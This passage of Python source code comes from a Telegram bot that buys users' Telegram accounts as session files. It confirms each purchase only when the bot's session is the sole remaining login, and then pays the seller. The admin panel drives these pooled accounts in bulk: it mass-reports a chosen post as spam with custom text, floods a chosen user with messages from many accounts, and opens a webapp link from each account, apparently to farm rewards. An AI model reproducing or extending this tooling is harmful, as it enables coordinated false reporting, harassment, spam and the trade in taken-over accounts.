                    await app.send_message(entity=chat_id, message=f'<b>✅ The operation was completed successfully!</b>\n\n◽️Success: <code>{op_status["success"]}</code>\n◽️Unsuccess: <code>{op_status["unsuccess"]}</code>')
                else:
                    await app.send_message(entity=chat_id, message=f'⚠️ The number sent is wrong or is more than the number of accounts in the bot!\n\n🔢 Total accounts: <code>{cursor.rowcount}</code>', buttons=back_to_accounts_operations)
            
            elif text == '◽️Start webapp':
                if os.path.exists('operation.txt'):
                    os.remove('operation.txt')
                await step('send_webapp_link', chat_id)
                await app.send_message(entity=chat_id, message='🆔 Send webapp link:\n\n◽️Example: https://t.me/bot/start?startapp=123456789', buttons=back_to_accounts_operations)

            elif user[2] == 'send_webapp_link':
                if text.startswith('https://t.me/'):
                    await step('send_count_webapp', chat_id)
                    await file_put('operation.txt', str(text) + "\n", 'a')
                    await app.send_message(entity=chat_id, message='🔢 How many accounts can the operation be done?', buttons=back_to_accounts_operations)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ Webapp link is invalid!', buttons=back_to_accounts_operations)
            
            elif user[2] == 'send_count_webapp':
                cursor.execute("SELECT * FROM `accounts`")
                if text.isnumeric() and int(text) > 0 and int(text) <= cursor.rowcount:
                    await step('none', chat_id)
                    webapp_link = str(await file_get('operation.txt')).split('\n')[0]
                    await app.send_message(entity=chat_id, message='<b>✅ Your process has started successfully!\n\n⚠️ Please do not work with the bot until the process is completed.</b>', buttons=accounts_operation)
                    # ------------------------------ #
                    op_status = {'success': 0, 'unsuccess': 0}
                    cursor.execute("SELECT * FROM `accounts` ORDER BY `row` DESC LIMIT %s", (int(text), ))
                    accounts = cursor.fetchall()
                    for account in accounts:
                        if os.path.exists(f'sessions/{account[3]}.json'):
                            reg = re.findall(r'https://t.me/(.*)/(.*)\?(.*)=(.*)', webapp_link)[0]
                            json_data = json.load(builtins.open(f'sessions/{account[3]}.json', 'r'))
                            try:
                                account = TelegramClient(session=f'sessions/{account[3]}', api_id=json_data['app_id'], api_hash=json_data['app_hash'], lang_code='en')
                                await account.connect()
                                
                                response = await account(RequestAppWebViewRequest(
                                    'me',
                                    InputBotAppShortName(await account.get_input_entity(reg[0]), reg[1]),
                                    'android',
                                    reg[3],
                                    reg[3]
                                ))
                                
                                if os.path.exists('links.txt'):
                                    os.unlink('links.txt')
                                    
                                with builtins.open('links.txt', 'a') as file:
                                    file.write(response.url + '\n')
                                    
                                await account.disconnect()
                                op_status['success'] += 1
                            except Exception as e:
                                print(f'[-] Error: {e}')
                                await account.disconnect()
                                op_status['unsuccess'] += 1
                        await asyncio.sleep(setting[11])
                    
                    await app.send_file(entity=chat_id, file='links.txt')
                    await app.send_message(entity=chat_id, message=f'<b>✅ The operation was completed successfully!</b>\n\n◽️Success: <code>{op_status["success"]}</code>\n◽️Unsuccess: <code>{op_status["unsuccess"]}</code>')
                else:
                    await app.send_message(entity=chat_id, message=f'⚠️ The number sent is wrong or is more than the number of accounts in the bot!\n\n🔢 Total accounts: <code>{cursor.rowcount}</code>', buttons=back_to_accounts_operations)
            
            elif text == '◽️Report post':
                if os.path.exists('operation.txt'):
                    os.remove('operation.txt')
                await step('send_message_link_report', chat_id)
                await app.send_message(entity=chat_id, message='🆔 Send message link:\n\n◽️Example: https://t.me/username/2', buttons=back_to_accounts_operations)
            
            elif user[2] == 'send_message_link_report':
                if text.startswith('https://t.me/'):
                    await step('send_report_text', chat_id)
                    await file_put('operation.txt', str(text) + "\n", 'a')
                    await app.send_message(entity=chat_id, message='✏️ Send report text:', buttons=back_to_accounts_operations)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ Message link is invalid!', buttons=back_to_accounts_operations)
            
            elif user[2] == 'send_report_text':
                await step('send_count_report', chat_id)
                await file_put('operation.txt', str(text) + "\n", 'a')
                await app.send_message(entity=chat_id, message='🔢 How many accounts can the operation be done?', buttons=back_to_accounts_operations)
            
            elif user[2] == 'send_count_report':
                cursor.execute("SELECT * FROM `accounts`")
                if text.isnumeric() and int(text) > 0 and int(text) <= cursor.rowcount:
                    await step('none', chat_id)
                    get_oper_data = str(await file_get('operation.txt')).split('\n')
                    await app.send_message(entity=chat_id, message='<b>✅ Your process has started successfully!\n\n⚠️ Please do not work with the bot until the process is completed.</b>', buttons=accounts_operation)
                    # ------------------------------ #
                    op_status = {'success': 0, 'unsuccess': 0}
                    cursor.execute("SELECT * FROM `accounts` ORDER BY `row` DESC LIMIT %s", (int(text), ))
                    accounts = cursor.fetchall()
                    for account in accounts:
                        if os.path.exists(f'sessions/{account[3]}.json'):
                            peer_username, post_msg_id = get_oper_data[0].split('t.me/')[1].split('/')
                            json_data = json.load(builtins.open(f'sessions/{account[3]}.json', 'r'))
                            try:
                                account = TelegramClient(session=f'sessions/{account[3]}', api_id=json_data['app_id'], api_hash=json_data['app_hash'], lang_code='en')
                                await account.connect()
                                await account(functions.messages.ReportRequest(peer=peer_username, id=[int(post_msg_id)], reason=types.InputReportReasonSpam(), message=get_oper_data[1]))
                                await account.disconnect()
                                op_status['success'] += 1
                            except Exception as e:
                                print(f'[-] Error: {e}')
                                await account.disconnect()
                                op_status['unsuccess'] += 1
                        await asyncio.sleep(setting[11])
                    await app.send_message(entity=chat_id, message=f'<b>✅ The operation was completed successfully!</b>\n\n◽️Success: <code>{op_status["success"]}</code>\n◽️Unsuccess: <code>{op_status["unsuccess"]}</code>')
                else:
                    await app.send_message(entity=chat_id, message=f'⚠️ The number sent is wrong or is more than the number of accounts in the bot!\n\n🔢 Total accounts: <code>{cursor.rowcount}</code>', buttons=back_to_accounts_operations)
            
            elif text == '◽️Send message to user':
                if os.path.exists('operation.txt'):
                    os.remove('operation.txt')
                await step('send_target_username', chat_id)
                await app.send_message(entity=chat_id, message='🆔 Send person username with @:', buttons=back_to_accounts_operations)
            
            elif user[2] == 'send_target_username':
                if text.startswith('@'):
                    await step('send_target_text', chat_id)
                    await file_put('operation.txt', str(text) + "\n", 'a')
                    await app.send_message(entity=chat_id, message='✏️ Send text:', buttons=back_to_accounts_operations)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ Username is invalid!', buttons=back_to_accounts_operations)
                
            elif user[2] == 'send_target_text':
                await step('send_count_send_text', chat_id)
                await file_put('operation.txt', str(text.replace('\n', '\\n')) + "\n", 'a')
                await app.send_message(entity=chat_id, message='🔢 How many accounts can the operation be done?', buttons=back_to_accounts_operations)
            
            elif user[2] == 'send_count_send_text':
                cursor.execute("SELECT * FROM `accounts`")
                if text.isnumeric() and int(text) > 0 and int(text) <= cursor.rowcount:
                    await step('none', chat_id)
                    get_oper_data = str(await file_get('operation.txt')).split('\n')
                    await app.send_message(entity=chat_id, message='<b>✅ Your process has started successfully!\n\n⚠️ Please do not work with the bot until the process is completed.</b>', buttons=accounts_operation)
                    # ------------------------------ #
                    op_status = {'success': 0, 'unsuccess': 0}
                    cursor.execute("SELECT * FROM `accounts` ORDER BY `row` DESC LIMIT %s", (int(text), ))
                    accounts = cursor.fetchall()
                    for account in accounts:
                        if os.path.exists(f'sessions/{account[3]}.json'):
                            json_data = json.load(builtins.open(f'sessions/{account[3]}.json', 'r'))
                            try:
                                account = TelegramClient(session=f'sessions/{account[3]}', api_id=json_data['app_id'], api_hash=json_data['app_hash'], lang_code='en')
                                await account.connect()
                                account.parse_mode = 'html'
                                await account.send_message(entity=get_oper_data[0], message=get_oper_data[1])
                                await account.disconnect()
                                op_status['success'] += 1
                            except Exception as e:
                                print(f'[-] Error: {e}')
                                await account.disconnect()
                                op_status['unsuccess'] += 1
                        await asyncio.sleep(setting[11])
                    await app.send_message(entity=chat_id, message=f'<b>✅ The operation was completed successfully!</b>\n\n◽️Success: <code>{op_status["success"]}</code>\n◽️Unsuccess: <code>{op_status["unsuccess"]}</code>')
                else:
                    await app.send_message(entity=chat_id, message=f'⚠️ The number sent is wrong or is more than the number of accounts in the bot!\n\n🔢 Total accounts: <code>{cursor.rowcount}</code>', buttons=back_to_accounts_operations)
            
            elif text == '📞 Manage accounts':
                wait = await app.send_message(entity=chat_id, message='<b>⏱ Please wait a few second ...</b>', reply_to=message_id)
                response = await get_accounts_key()
                if response != False:
                    stat = await get_bot_stat()
                    await app.edit_message(entity=chat_id, message=wait.id, text=f"📞 Welcome to the account management section.\n\n◽️Total accounts: {stat['all_accounts']}\n◽️Confirmed accounts: {stat['confirmed_accounts']}\n◽️Unconfirmed accounts: {stat['unconfirmed_accounts']}\n\n✅ -> Account confirmed\n❌ -> Account unconfirmed\n\n🔽 Choose one of the following options:", buttons=response)
                else:
                    await app.edit_message(entity=chat_id, message=wait.id, text=f'⚠️ There is no account in the bot!', buttons=add_session_to_bot_btn)
            
            elif user[2] == 'send_zip_file_for_add':
                if event.document:
                    file_name = str(event.document.attributes[0].file_name)
                    if file_name.endswith('.zip'):
                        await step('none', chat_id)
                        wait = await app.send_message(entity=chat_id, message='<b>⏱ Please wait a few second ...</b>')
                        
                        if os.path.exists('temproray_sessions'):
                            shutil.rmtree('temproray_sessions')
                        
                        await event.download_media(file=file_name)
                        os.makedirs('temproray_sessions', exist_ok=True)
                        with zipfile.ZipFile(file_name, 'r') as zip_ref:
                            zip_ref.extractall('temproray_sessions')
                        
                        status = await add_session_to_bot(chat_id=chat_id, folder_name='temproray_sessions')
                        os.remove(file_name)
                        
                        await app.send_message(entity=chat_id, message=f'✅ Add done.\n\n◽️Successful: {status["success"]}\n◽️Unsuccessful: {status["unsuccess"]}', buttons=panel)
                    else:
                        await app.send_message(entity=chat_id, message='⚠️ Please only send <b>.zip</b> files!', buttons=back_to_panel)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ Please only send files!', buttons=back_to_panel)
            
            elif text == '👥 Manage users':
                await step('send_user_id_for_info', chat_id)
                await app.send_message(entity=chat_id, message='🆔 Send the numerical ID of the desired person:', reply_to=message_id, buttons=back_to_panel)
            
            elif user[2] == 'send_user_id_for_info':
                if text.isnumeric():
                    if await exists_user(chat_id=text):
                        await step('none', chat_id)
                        wait = await app.send_message(entity=chat_id, message='<b>⏱ Please wait a few second ...</b>', reply_to=message_id)
                        response = await get_user_data(chat_id=text)
                        get_chat = await app.get_entity(entity=int(text))
                        cursor.execute("SELECT * FROM `accounts` WHERE `from_id` = %s", (text, ))
                        manage_user_btn = [
                            [Button.inline(text='🗑 Reset balance (0)', data='reset_balance-' + text)],
                            [Button.inline(text='➖ Deduction balance', data='deduction_balance-' + text), Button.inline(text='➕ Add balance', data='add_balance-' + text)],
                            [Button.inline(text='❌ Block user', data='block_user-' + text), Button.inline(text='✅ Unblock user', data='unblock_user-' + text)],
                            [Button.inline(text='💬 Send message to user', data='send_msg_to_user-' + text)]
                        ]
                        await app.edit_message(entity=chat_id, message=wait.id, text=f"🔍 User information [ <code>{text}</code> ] has been received successfully.\n\n◽️Name: <b>{get_chat.first_name}</b>\n◽️Username: {'@' + get_chat.username if get_chat.username is not None else 'None'}\n◽️Language: <b>{'🇮🇷' if response[6] == 'fa' else '🏴󠁧󠁢󠁥󠁮󠁧󠁿'}</b>\n◽️Wallet address: <code>{response[4]}</code>\n◽️Balance: ${response[3]}\n◽️Number of sent accounts: {cursor.rowcount}\n◽️Join date: <code>{0 if response[5] == 0 else datetime.utcfromtimestamp(response[5]).strftime('%Y/%m/%d - %H:%M:%S')}</code>\n◽️Status: {'✅ Unblock' if response[7] == True else '❌ Block'}", buttons=manage_user_btn)
                        await app.send_message(entity=chat_id, message='🔙 You are back to the main menu.', buttons=panel)
                    else:
                        await app.send_message(entity=chat_id, message='⚠️ The sent numerical ID is not a member of the bot!', reply_to=message_id, buttons=back_to_panel)    
                else:
                    await app.send_message(entity=chat_id, message='⚠️ The numerical ID sent is wrong!', reply_to=message_id, buttons=back_to_panel)
            
            elif 'send_coin_for_add' in user[2]:
                user_chat_id = user[2].split('-')[1]
                if text.isnumeric() and int(text) > 0:
                    await step('none', chat_id)
                    cursor.execute("UPDATE `users` SET `balance` = balance + %s WHERE `from_id` = %s", (text, user_chat_id))
                    db.commit()
                    await app.send_message(entity=chat_id, message=f'✅ Successfully added [ <code>{text}</code> ] to user [ <code>{user_chat_id}</code> ].\n\n⏱ <code>{date} - {time}</code>', buttons=panel)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ Input is invalid!', buttons=back_to_panel)
            
            elif 'send_coin_for_ded' in user[2]:
                user_chat_id = user[2].split('-')[1]
                if text.isnumeric() and int(text) > 0:
                    await step('none', chat_id)
                    cursor.execute("UPDATE `users` SET `balance` = balance - %s WHERE `from_id` = %s", (text, user_chat_id))
                    db.commit()
                    await app.send_message(entity=chat_id, message=f'✅ Successfully deducted [ <code>{text}</code> ] from user [ <code>{user_chat_id}</code> ].\n\n⏱ <code>{date} - {time}</code>', buttons=panel)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ Input is invalid!', buttons=back_to_panel)
            
            elif 'send_text_for_send' in user[2]:
                user_chat_id = int(user[2].split('-')[1])
                await app.send_message(entity=user_chat_id, message=text)
                await app.send_message(entity=chat_id, message=f'✅ Your message has been successfully sent to user [ <code>{user_chat_id}</code> ].\n\n⏱ <code>{date} - {time}</code>', reply_to=message_id, buttons=panel)
                await step('none', chat_id)
            
            elif text == '👮‍♀ Manage admins':
                wait = await app.send_message(entity=chat_id, message='<b>⏱ Please wait a few second ...</b>', reply_to=message_id)
                await app.edit_message(entity=chat_id, message=wait.id, text='👮‍♀ Welcome to the <b>admins</b> management section.\n\n🔽 Choose one of the following options:', buttons=manage_admins)
            
            elif user[2] == 'send_chat_id_for_addadmin':
                if text.isnumeric():
                    if await exists_user(text):
                        await step('none', chat_id)
                        cursor.execute("INSERT INTO `admins` (`from_id`, `username`, `password`, `status`) VALUES (%s, %s, %s, %s)", (text, 'none', 'none', 1))
                        db.commit()
                        await app.send_message(entity=chat_id, message=f'✅ The user [ <code>{text}</code> ] has been successfully added to the list of bot admins.\n\n⏱ <code>{date} - {time}</code>', reply_to=message_id, buttons=manage_admins)
                    else:
                        await app.send_message(entity=chat_id, message='⚠️ The sent numerical ID is not a member of the robot!', reply_to=message_id, buttons=back_to_manage_admins)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ The numeric ID sent is invalid!', reply_to=message_id, buttons=back_to_manage_admins)
            
            elif user[2] == 'send_chat_id_for_remadmin':
                if text.isnumeric():
                    if await exists_user(text):
                        await step('none', chat_id)
                        cursor.execute("DELETE FROM `admins` WHERE `from_id` = %s", (text, ))
                        db.commit()
                        await app.send_message(entity=chat_id, message=f'✅ The user [ <code>{text}</code> ] has been successfully removed in the list of bot admins.\n\n⏱ <code>{date} - {time}</code>', reply_to=message_id, buttons=manage_admins)
                    else:
                        await app.send_message(entity=chat_id, message='⚠️ The sent numerical ID is not a member of the robot!', reply_to=message_id, buttons=back_to_manage_admins)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ The numeric ID sent is invalid!', reply_to=message_id, buttons=back_to_manage_admins)
            
            elif text == '📢 Manage channels':
                wait = await app.send_message(entity=chat_id, message='<b>⏱ Please wait a few second ...</b>', reply_to=message_id)
                await app.edit_message(entity=chat_id, message=wait.id, text='📢 Welcome to the <b>channels</b> management section.\n\n🔽 Choose one of the following options:', buttons=manage_channels)
            
            elif user[2] == 'send_channel_username_for_add':
                if len(text) > 3 and text.startswith('@'):
                    if await channel_exists(text) == False:
                        await step('none', chat_id)
                        cursor.execute("INSERT INTO `channels` (`channel`, `status`) VALUES (%s, %s)", (text, 1))
                        db.commit()
                        await app.send_message(entity=chat_id, message='✅ Username has been successfully added.', reply_to=message_id, buttons=manage_channels)
                    else:
                        await app.send_message(entity=chat_id, message='⚠️ Username is already exists!', reply_to=message_id, buttons=back_to_manage_channels)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ Username is invalid!', reply_to=message_id, buttons=back_to_manage_channels)
            
            elif user[2] == 'send_channel_username_for_remove':
                if len(text) > 3 and text.startswith('@'):
                    if await channel_exists(text) == True:
                        await step('none', chat_id)
                        cursor.execute("DELETE FROM `channels` WHERE `channel` = %s", (text, ))
                        db.commit()
                        await app.send_message(entity=chat_id, message='✅ Username has been successfully deleted.', reply_to=message_id, buttons=manage_channels)
                    else:
                        await app.send_message(entity=chat_id, message='⚠️ Username is not exists!', reply_to=message_id, buttons=back_to_manage_channels)   
                else:
                    await app.send_message(entity=chat_id, message='⚠️ Username is invalid!', reply_to=message_id, buttons=back_to_manage_channels)
            
            elif text == '🌍 Manage capacity/country':
                wait = await app.send_message(entity=chat_id, message='<b>⏱ Please wait a few second ...</b>', reply_to=message_id)
                cursor.execute("SELECT * FROM `open_country`")
                count_open = cursor.rowcount
                cursor.execute("SELECT * FROM `close_country`")
                count_close = cursor.rowcount
                await app.edit_message(entity=chat_id, message=wait.id, text=f'🌍 Welcome to the <b>capacity/country</b> management section.\n\n🔢 Total number of current open countries: {count_open}\n🔢 Total number of current close countries: {count_close}', buttons=manage_countries)
            
            elif text == '🛡Manage proxies':
                wait = await app.send_message(entity=chat_id, message='<b>⏱ Please wait a few second ...</b>', reply_to=message_id)
                cursor.execute("SELECT * FROM `proxies`")
                await app.edit_message(entity=chat_id, message=wait.id, text=f'🛡 Welcome to the <b>proxy</b> management section.\n\n🔢 Total number of current bot proxies: {cursor.rowcount}', buttons=manage_proxies)
            
            elif user[2] == 'send_proxy_file':
                if event.document:
                    file_name = str(event.document.attributes[0].file_name)
                    if file_name.endswith('.txt'):
                        await step('none', chat_id)
                        wait = await app.send_message(entity=chat_id, message='<b>⏱ Please wait a few second ...</b>')
                        await event.download_media(file=file_name)
                        status = await add_proxies(file_name=file_name)
                        os.remove(file_name)
                        await app.edit_message(entity=chat_id, message=wait.id, text=f'✅ The operation was done successfully and all proxies were added.\n\n◽️Successful: {status["success"]}\n◽️Unsuccessful: {status["unsuccess"]}', buttons=manage_proxies)
                    else:
                        await app.send_message(entity=chat_id, message='⚠️ Please only send <b>.txt</b> files!', buttons=back_to_manage_proxies)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ Please only send files!', buttons=back_to_manage_proxies)
            
            elif user[2] == 'send_country_code_delete':
                if len(text) >= 1 and text.startswith('+'):
                    if await country_code_exists(text) == True:
                        await step('none', chat_id)
                        cursor.execute("DELETE FROM `open_country` WHERE `country_code` = %s", (text, ))
                        db.commit()
                        await app.send_message(entity=chat_id, message=f'🗑 Country [ <code>{text}</code> ] was successfully removed from bot.\n\n⏱ <code>{date} - {time}</code>', reply_to=message_id, buttons=manage_countries)
                    else:
                        await app.send_message(entity=chat_id, message='⚠️ This country not find in the bot!', reply_to=message_id, buttons=back_to_manage_country)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ The prefix entered is invalid!', buttons=back_to_manage_country)
            
            elif user[2] == 'send_country_name':
                if len(text) > 2:
                    if await country_name_exists(text) == False:
                        await step('send_country_code', chat_id)
                        await file_put('open_country.txt', text + "\n", 'a')
                        await app.send_message(entity=chat_id, message='🔢 Send the prefix of the country: (e.x: +880)', reply_to=message_id, buttons=back_to_manage_country)
                    else:
                        await app.send_message(entity=chat_id, message='⚠️ This country has already been added to the bot!', reply_to=message_id, buttons=back_to_manage_country)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ The entered name is invalid!', buttons=back_to_manage_country)
            
            elif user[2] == 'send_country_code':
                if len(text) >= 1 and text.startswith('+'):
                    if await country_code_exists(text) == False:
                        await step('send_country_flag', chat_id)
                        await file_put('open_country.txt', text + "\n", 'a')
                        await app.send_message(entity=chat_id, message='🔢 Send the flag of the country: (e.x: 🇺🇸)', reply_to=message_id, buttons=back_to_manage_country)
                    else:
                        await app.send_message(entity=chat_id, message='⚠️ This country has already been added to the bot!', reply_to=message_id, buttons=back_to_manage_country)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ The prefix entered is invalid!', buttons=back_to_manage_country)
            
            elif user[2] == 'send_country_flag':
                await step('send_country_price', chat_id)
                await file_put('open_country.txt', text + "\n", 'a')
                await app.send_message(entity=chat_id, message='🔢 Send the price of the country: (e.x: 0.85)', reply_to=message_id, buttons=back_to_manage_country)
            
            elif user[2] == 'send_country_price':
                if float(text) > 0:
                    await step('send_country_capacity', chat_id)
                    await file_put('open_country.txt', text + "\n", 'a')
                    await app.send_message(entity=chat_id, message='🔢 Send the capacity of the country: (e.x: 1000)', reply_to=message_id, buttons=back_to_manage_country)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ The price entered is invalid!', buttons=back_to_manage_country)
            
            elif user[2] == 'send_country_capacity':
                if int(text) > 0:
                    await step('send_country_time', chat_id)
                    await file_put('open_country.txt', text + "\n", 'a')
                    await app.send_message(entity=chat_id, message='🔢 Send the confirm time of the country based on minutes: (e.x: 5)', reply_to=message_id, buttons=back_to_manage_country)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ The capacity entered is invalid!', buttons=back_to_manage_country)
            
            elif user[2] == 'send_country_time':
                if int(text) > 0:
                    await step('none', chat_id)
                    country_data = await get_temporary_country_data(file_name='open_country.txt')
                    if country_data != False:
                        cursor.execute("INSERT INTO `open_country` (`country_name`, `country_code`, `country_flag`, `country_price`, `country_capacity`, `country_time`, `status`) VALUES (%s, %s, %s, %s, %s, %s, %s)", (country_data[0], country_data[1], country_data[2], float(country_data[3]), int(country_data[4]), float(text), 1))
                        db.commit()
                        await app.send_message(entity=chat_id, message=f'✅ Your selected country [ <code>{country_data[1]}</code> ] has been successfully added to the bot.\n\n⏱ <code>{date} - {time}</code>', reply_to=message_id, buttons=manage_countries)
                    else:
                        await app.send_message(entity=chat_id, message='⚠️ There was an error opening the country.', buttons=manage_countries)
                    os.remove('open_country.txt')
                else:
                    await app.send_message(entity=chat_id, message='⚠️ The time entered is invalid!', buttons=back_to_manage_country)
    except mysql_errors.OperationalError as e:
        # db = connect(host='localhost', user=config['database']['db_name'], password=config['database']['db_password'], database=config['database']['db_username'])
        # cursor = db.cursor(buffered=True)
        print(f'-------------\n[-] Mysql error: {e}\n-------------')

@app.on(event=events.CallbackQuery())
async def main(event):
    # --------- [ varibales ] --------- #
    texts = json.load(open('data/texts.json', 'r', encoding='UTF-8'))
    
    data = event.data
    callback_id = event.id
    chat_id = event.original_update.user_id
    message_id = event.original_update.msg_id
    first_name = getattr(event.chat, 'first_name', None)
    last_name = getattr(event.chat, 'last_name', None)
    username = '❌' if event.chat.username is None else event.chat.username

    # --------- [ Insert and get user data ] --------- #
    cursor.execute("SELECT * FROM `users` WHERE `from_id` = %s", (chat_id, ))
    if cursor.rowcount == 0:
        cursor.execute("INSERT INTO `users` (`from_id`, `join_time`) VALUES (%s, %s)", (chat_id, int(timestamp())))
        db.commit()
        user = cursor.fetchone()
    else:
        user = cursor.fetchone()
    
    cursor.execute("SELECT * FROM `settings`")
    if cursor.rowcount == 0:
        cursor.execute("INSERT INTO `settings` () VALUES ()")
    else:
        setting = cursor.fetchone()
    
    cursor.execute("SELECT * FROM `admins`")
    if cursor.rowcount == 0:
        admins = []
    else:
        admins = [admin[1] for admin in cursor.fetchall() if admin[4] == True]
        
    # --------- [ Date and Time ] --------- #
    if user[6] == 'none' or user[6] == 'en':
        date = datetime.now().strftime('%Y/%m/%d')
        time =datetime.now().strftime('%H:%M:%S')
    elif user[6] == 'fa':
        date = jdatetime.now().strftime('%Y/%m/%d')
        time = jdatetime.now().strftime('%H:%M:%S')
    
    # --------- [ Conditions ] --------- #
    if data.decode() == 'withdrawal_balance':
        if user[3] >= setting[0] and user[3] <= setting[1]:
            await step('send_leader_name', chat_id)
            await app.delete_messages(entity=chat_id, message_ids=message_id)
            await app.send_message(entity=chat_id, message=texts['send_leader_name'][user[6]], reply_to=message_id)
        else:
            await event.answer(message=str(texts['minimum_with_error'][user[6]]).format(setting[0]), alert=True)
    
    elif 'confirm_account' in data.decode():
        country_code = str(data.decode()).split('|')[1]
        phone = str(data.decode()).split('|')[2]
        sub_time = int(str(data.decode()).split('|')[3])
        
        confirm_key = [[Button.inline(text='🔍 Confirm account', data=f'confirm_account|{country_code}|{phone}|{str(sub_time)}')]]
        
        cursor.execute("SELECT * FROM `accounts` WHERE `from_id` = %s AND `number` = %s AND `status` = 1", (chat_id, phone))
        if cursor.rowcount == 0:
            
            cursor.execute("SELECT * FROM `open_country` WHERE `country_code` = %s", ('+' + country_code, ))
            if cursor.rowcount > 0:
                get_fet = cursor.fetchone()
                con_time = get_fet[6]
                money = get_fet[4]
            else:
                money = 0
                con_time = 0
            
            if await confirm_account(sub_time, con_time) == True:
                try:
                    json_data = json.load(open(f'sessions/{phone}.json', 'r'))
                    proxy = None if json_data['proxy'] is None or json_data['proxy'] == '' or json_data['proxy'] == 'null' else await generate_proxy_dict(json_data['proxy'])
                    
                    try:
                        await app.edit_message(entity=chat_id, message=message_id, text='<b>⏱ Please wait a few second ...</b>')
                        
                        if proxy is not None:
                            account = TelegramClient(session=f'sessions/{phone}', api_id=json_data['app_id'], api_hash=json_data['app_hash'], lang_code='en', system_lang_code='en-US', device_model=json_data['sdk'], app_version=json_data['app_version'], system_version=json_data['system_version'], proxy=proxy)
                        else:
                            account = TelegramClient(session=f'sessions/{phone}', api_id=json_data['app_id'], api_hash=json_data['app_hash'], lang_code='en', system_lang_code='en-US', device_model=json_data['sdk'], app_version=json_data['app_version'], system_version=json_data['system_version'])
                        await account.connect()
                        
                        all_sessions = await account(functions.account.GetAuthorizationsRequest())
                        print(f"\nphone: {phone}\nsessions:\n{all_sessions}\ncount: {len(all_sessions.authorizations)}")
                        
                        if len(all_sessions.authorizations) == 1:
                            if setting[9] == False:
                                await account.disconnect()
                                cursor.execute("UPDATE `users` SET `balance` = balance + %s, `count_accounts` = count_accounts + 1 WHERE `from_id` = %s", (money, chat_id))
                                db.commit()
                                cursor.execute("UPDATE `accounts` SET `status` = %s WHERE `from_id` = %s AND `number` = %s", (1, chat_id, phone))
                                db.commit()
                                await app.delete_messages(entity=chat_id, message_ids=message_id)
                                await app.send_message(entity=chat_id, message=str(texts['success_confirm'][user[6]]).format(money))
                            else:
                                await account(functions.messages.StartBotRequest(bot='SpamBot', peer='SpamBot', start_param='123456789'))
                                await asyncio.sleep(1)
                                async for message in account.iter_messages(entity='@SpamBot'):
                                    spam_status = await check_spam_bot(message.message)
                                    if spam_status == True:
                                        await account.disconnect()
                                        cursor.execute("UPDATE `users` SET `balance` = balance + %s, `count_accounts` = count_accounts + 1 WHERE `from_id` = %s", (money, chat_id))
                                        db.commit()
                                        cursor.execute("UPDATE `accounts` SET `status` = %s WHERE `from_id` = %s AND `number` = %s", (1, chat_id, phone))
                                        db.commit()
                                        await app.delete_messages(entity=chat_id, message_ids=message_id)
                                        await app.send_message(entity=chat_id, message=str(texts['success_confirm'][user[6]]).format(money))
                                    else:
                                        await account.disconnect()
                                        await app.edit_message(entity=chat_id, message=message_id, text=str(texts['account_received'][user[6]]).format(phone, con_time, date, time), buttons=confirm_key)
                                        await event.answer(message=texts['account_limited'][user[6]], alert=True)
                        else:
                            await account.disconnect()
                            await app.edit_message(entity=chat_id, message=message_id, text=str(texts['account_received'][user[6]]).format(phone, con_time, date, time), buttons=confirm_key)
                            await event.answer(message=texts['terminate_all_sessions'][user[6]], alert=True)
                    except Exception as error:
                        print(f'[-][1] Acc problem: {error}')
                        await account.disconnect()
                        await app.edit_message(entity=chat_id, message=message_id, text=str(texts['account_received'][user[6]]).format(phone, con_time, date, time), buttons=confirm_key)
                        await event.answer(message=texts['account_problem'][user[6]], alert=True)
                except Exception as error:
                    print(f'[-][2] Acc problem: {error}')
                    await app.edit_message(entity=chat_id, message=message_id, text=str(texts['account_received'][user[6]]).format(phone, con_time, date, time), buttons=confirm_key)
                    await event.answer(message=texts['account_problem'][user[6]], alert=True)
            else:
                await event.answer(message=str(texts['wait_to_confirm'][user[6]]).format((con_time * 60) - (int(timestamp()) - sub_time)), alert=True)
        else:
            await event.answer(message=texts['confirm_error'][user[6]], alert=True)
    
    if int(chat_id) == config['dev'] or int(chat_id) in config['admins'] or int(chat_id) in admins:
        if 'payment_done' in data.decode():
            user_chat_id = str(data.decode()).split('-')[1]
            user_price = str(data.decode()).split('-')[2]
            user_leader_name = str(data.decode()).split('-')[3]
            get_user = await get_user_data(chat_id=user_chat_id)
            await app.edit_message(entity=event.original_update.peer.channel_id, message=message_id, text=f'<b>✅ Payment done!</b>\n\n◽️Chat id: <code>{user_chat_id}</code>\n◽️Price: <code>${user_price}</code>\n◽️Leader name: <b>{user_leader_name}</b>\n\n⏱ <code>{date} - {time}</code>')
            await app.send_message(entity=user_chat_id, message=str(texts['payment_success_done'][get_user[6]]).format(user_price, user_leader_name))
        
        elif data.decode() == 'delete_message':
            await app.delete_messages(entity=chat_id, message_ids=message_id)
        
        elif data.decode() == 'reset_all_users_balance':
            cursor.execute("UPDATE `users` SET `balance` = 0")
            db.commit()
            await event.answer(message='🗑 This all users balance has been successfully reduced to 0.', alert=True)
            
        # --------- manage users --------- #
        elif 'reset_balance' in data.decode():
            user_chat_id = str(data.decode()).split('-')[1]
            cursor.execute("UPDATE `users` SET `balance` = 0 WHERE `from_id` = %s", (user_chat_id, ))
            db.commit()
            await event.answer(message='🗑 This user balance has been successfully reduced to 0.', alert=True)
            
        elif 'add_balance' in data.decode():
            user_chat_id = str(data.decode()).split('-')[1]
            await step('send_coin_for_add-' + user_chat_id, chat_id)
            await app.send_message(entity=chat_id, message=f'💸 Send the desired amount [ <code>{user_chat_id}</code> ]:', buttons=back_to_panel)
        
        elif 'deduction_balance' in data.decode():
            user_chat_id = str(data.decode()).split('-')[1]
            await step('send_coin_for_ded-' + user_chat_id, chat_id)
            await app.send_message(entity=chat_id, message=f'💸 Send the desired amount [ <code>{user_chat_id}</code> ]:', buttons=back_to_panel)
        
        elif 'unblock_user-' in data.decode():
            user_chat_id = str(data.decode()).split('-')[1]
